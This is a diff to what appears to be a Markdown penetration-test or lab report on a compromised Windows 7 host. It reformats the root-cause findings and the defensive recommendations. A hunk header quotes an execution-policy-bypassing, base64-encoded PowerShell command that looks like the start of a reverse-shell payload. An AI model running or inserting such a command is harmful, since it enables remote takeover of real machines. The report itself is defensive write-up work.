@@ -272,7 +272,8 @@ powershell -NoProfile -ExecutionPolicy Bypass -EncodedCommand JABjAGwAaQBlAG4AdA
 
 ---
 ## 🚨 Security Findings & Recommendations
-Root Causes Identified
+> Root Causes Identified
+
 🔴 Legacy Operating System: Windows 7 architecture lacks modern memory and credential protections.
 
 🔴 Weak UAC Implementation: Allowed token duplication without secure desktop prompting.
@@ -282,7 +283,8 @@ Root Causes Identified
 🟠 Unrestricted Log Tampering: SYSTEM accounts possessed the ability to destroy primary host-based telemetry.
 
 ---
-Defensive Recommendations
+> Defensive Recommendations
+
 🔄 Modernize Legacy Systems: Migrate unsupported operating systems to Windows 10/11.
 
 🔒 Restrict Execution Permissions: Limit write permissions to Startup folder locations for standard users.
